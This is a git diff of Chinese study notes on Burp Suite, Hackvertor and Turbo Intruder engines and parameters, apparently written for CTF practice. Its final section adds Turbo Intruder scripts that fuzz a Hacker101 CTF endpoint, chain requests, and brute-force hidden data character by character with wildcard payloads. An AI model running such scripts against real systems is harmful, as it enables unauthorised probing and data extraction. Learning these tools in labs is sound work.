@@ -7,7 +7,7 @@ Burp 工具 tips：
     - 高亮提取位置功能在爆破前后均可用。即，可对爆破后的结果进行高亮提取，而无需设置新提取位置后再次爆破
     - 不同于集束炸弹模式的所有载荷交叉组合。平行叉模式仅平行对应载荷节的载荷，直到其中一个载荷节耗尽载荷，请求数量为所有载荷节中的最小载荷数量
     - 集束炸弹模式下设置第二个载荷为 NULL 型 N 次，等效于重复第一个载荷 N 次
-
+    - 异常条目重新发送：选择条目并在右键菜单使用“重新请求条目”
 - 宏
     - 录制前置宏后，攻击器将自动提取前置宏字段更新当前请求
 
@@ -21,6 +21,8 @@ Burp 工具 tips：
         2. 在 **Connections** 下，启用 **Allow HTTP/2 ALPN override** 选项。
         3. 在 Repeater 中，转到 **Inspector** 面板并展开 **Request attributes** 部分。
         4. 使用开关将 **Protocol** 设置为 **HTTP/2**。Burp 现在将在此选项卡上使用 HTTP/2 发送所有请求，无论服务器是否通告支持此协议。
+
+    - 分隔字符串的列表形式中，编辑字符导致长度错误或其他错误（文件上传时编辑文件名）。使用其他工具，或在浏览器编辑
 
 - logger
     - 查看扩展探测请求
@@ -61,6 +63,10 @@ Param Miner
 浏览器 DOM 插件
 - 使用功能后新窗口对应特定功能开关，若在查看汇的窗口继续其他 lab，或导致由于设置仅聚焦汇（隐藏源），导致无任何发现
 
+hackvertor
+- 在请求面板中点击“智能解码”即可立即转换为标签与原文，而无需手动解码后再手动添加标签
+- 保存几个常用的标签，例如正则表达式替换
+
 ## 增强攻击器
 
 https://github.com/PortSwigger/turbo-intruder/blob/master/docs/index.md
@@ -98,6 +104,66 @@ def handleResponse(req, interesting):
 - `pipeline=[True|N]`
     读取响应之前发送所有请求，或每 N 个请求读取
 
+#### 引擎类型
+
+https://github.com/PortSwigger/turbo-intruder/blob/master/docs/engines.md
+
+类型：
+- `Engine.THREADED` HTTP/1.1 默认
+- `Engine.BURP` HTTP/1.1
+- `Engine.BURP2` HTTP/2
+
+> 若模板设置 HTTP/2 应当使用对应的 `Engine.BURP2`
+> - 模板 HTTP/1.1 使用 `Engine.BURP2` 不会报错
+> - 模板 HTTP/2 不使用 `Engine.BURP2` 报错
+
+##### Engine.THREADED
+
+```py
+engine = RequestEngine(endpoint=target.endpoint,
+                       engine=Engine.THREADED,
+                       concurrentConnections=1,
+                       requestsPerConnection=10,
+                       pipeline=True,
+                       timeout=10,
+                       readCallback=myCallback,
+                       readSize=1024,
+                       resumeSSL=True)
+```
+
+
+默认使用的引擎，多个参数仅对应当前引擎
+
+> 或存在各种错误，优先使用 BURP2
+
+
+##### Engine.BURP
+
+```py
+engine = RequestEngine(endpoint=target.endpoint,
+                       engine=Engine.BURP,
+                       concurrentConnections=20)
+```
+
+限制
+- `requestsPerConnection` 限制为1，发送后即关闭
+- 不支持 `Engine.THREADED` 的多个参数
+
+##### Engine.BURP2
+
+```py
+engine = RequestEngine(endpoint=target.endpoint,
+                       engine=Engine.BURP2,
+                       concurrentConnections=1)
+```
+
+功能
+- HTTP/2 的单连接复用
+
+限制
+- `requestsPerConnection` 限制为1
+- 不支持 `Engine.THREADED` 的多个参数
+
 ### engine —— 请求引擎实例
 
 - `engine.openGate('race1')` 
@@ -106,17 +172,25 @@ def handleResponse(req, interesting):
 - `engine.queue()` 
     设置请求
 
-### engine.queue —— 设置请求
+#### engine.queue() 
 
-在请求模板中设置 `%s` 作为注入点
+https://github.com/PortSwigger/turbo-intruder/blob/master/docs/settings.md#enginequeue-parameters
 
+参数：
 - `template=target.req`
-    字符串型模板，使用载荷填充占位符 `%s`。通常使用发送到扩展的请求 `target.req`
+    字符串型模板，使用载荷填充占位符注入点 `%s`。通常使用发送到扩展的请求 `target.req`
 
 - `payloads`
     用来填充模板占位符的载荷：单个值、列表、无
     - `"$randomplz"`
         特殊载荷：随机10个字符的字母数字字符串
+
+- `callback`
+    自定义回调函数，覆盖默认的 `handleResponse()`
+    - 无 bool 型返回值出现错误日志，添加任意 bool
+    
+- `label`
+    自定义分组标签：在多类请求时快速区分请求组
 
 - `gate=race1`
     设置竞争条件的 gate 名称
@@ -127,13 +201,23 @@ def handleResponse(req, interesting):
     暂停的持续时间，单位毫秒
 - `pauseBefore` 
     暂停偏移量
+
+
     
+> 注，示例中在响应的回调函数中可使用 `req.engine.queue` 复用引擎，但实际上或导致错误。在请求2建立新引擎
+
 ### table —— 结果表格
 
 - `table.add(req)`
     添加请求到结果表格
 
 ### req —— 请求对象属性
+
+- `req.response`
+    完整响应
+
+- `req.request`
+    完整请求
 
 ### 示例
 
@@ -201,3 +285,78 @@ for attempt in range(999):
     engine.openGate(currentAttempt)
 ```
 - 预期请求模板在 `cookie/csrf令牌/用户名` 3处设置 `%s` 占位符
+
+
+```py
+# 端点a发送载荷并提取其中的数据作为端点b
+import re
+import urllib
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(
+        endpoint=target.endpoint,
+        engine=Engine.BURP2,
+        concurrentConnections=1
+    )
+
+    for word in open('E:\words.txt'):
+        # 示例的注入点上下文为字符串内，对载荷进行 URL 编码
+        # 将载荷添加到标签，用来在请求2的结果表中显示原始载荷
+        # 添加自定义响应处理函数，与默认处理函数分离。
+        ## 请求1的响应到自定义处理函数
+        engine.queue(target.req, urllib.quote(word.rstrip()), callback=my_response_handle, label=word.rstrip())
+
+# 自定义处理函数提取响应1，并构造请求2
+def my_response_handle(req, interesting):
+
+    # 正则表达式提取请求1的响应，作为请求2的 URL
+    match = re.search(r"/\?data=(.+?)\">", req.response)
+    if match:
+        res_b64_json = match.group(1)
+        # print("res_b64_json:\n{}\n".format(res_b64_json))
+
+        req_check = """GET /r3c0n_server_4fdk59/picture/?data={res_b64_json} HTTP/2
+Host: id.ctf.hacker101.com""".format(res_b64_json=res_b64_json)
+        # print("req_check:\n{}\n".format(req_check))
+        
+        # 尝试复用引擎时异常，此处新建引擎。是否存在更高效的方式？
+        engine = RequestEngine(
+            endpoint=target.endpoint,
+            engine=Engine.BURP2,
+            concurrentConnections=1
+        )
+
+        # 传递请求1标签到请求2，从而显示在结果表中
+        engine.queue(req_check, label=req.label)
+
+def handleResponse(req, interesting):
+    # 示例为模糊测试，查看所有响应    
+    table.add(req)
+
+```
+- 其中，若尝试暴破
+    ```py
+    def queueRequests(target, wordlists):
+        ...
+        char_str = "abcdefghijklmnopqrstuvwxyz0123456789"
+
+        for i in range(10):
+            # 另一种方式：每暴破到一个字符即使用当前字符进行后续暴破，遍历使用全局变量且发生在请求1的回调函数中
+            for char in char_str:
+                # 示例使用单字符匹配符 `_` 逐个暴破
+                cur_payload = '_'*i + char
+                engine.queue(target.req, cur_payload, callback=my_response_handle, label="{i}:{char}".format(i=i, char=char))
+
+    # 设置全局变量保存暴破结果
+    res_str = ''
+
+    def handleResponse(req, interesting):
+        global res_str
+        # 设置特定条件，过滤添加到结果表的数据
+        if "hit 独特字符串" in req.response:
+            table.add(req)
+            # 示例使用标签传递原始载荷，此处仅提取字符。虽然应当同时提取索引编号以确保字符集覆盖
+            res_str += req.label[2]
+            # 在扩展 log 中查看组合的暴破结果
+            print(">>{res_str}<<".format(res_str=res_str))
+    ```
